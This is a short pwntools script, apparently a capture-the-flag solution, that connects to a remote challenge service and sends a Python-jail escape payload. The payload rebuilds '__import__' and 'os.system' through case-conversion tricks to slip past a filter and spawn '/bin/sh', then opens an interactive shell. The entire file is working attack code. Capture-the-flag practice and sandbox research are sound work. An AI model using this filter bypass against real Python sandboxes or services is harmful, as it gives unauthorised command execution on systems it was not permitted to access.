from pwn import *

# elf = context.binary = ELF('./chall')
# libc = elf.libc

local = False

if local:
    io = elf.process()
else:
    host = '34.148.103.218'
    port = 1227
    io = remote(host, port)

if args.GDB:
    gdb.attach(io, """
        b *main
        c
    """)

io.recvuntil(b'>>> ')
io.sendline(b'cow')

io.recvuntil(b'>>> ')
payload = b"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/sh')"
io.sendline(payload)

io.interactive()
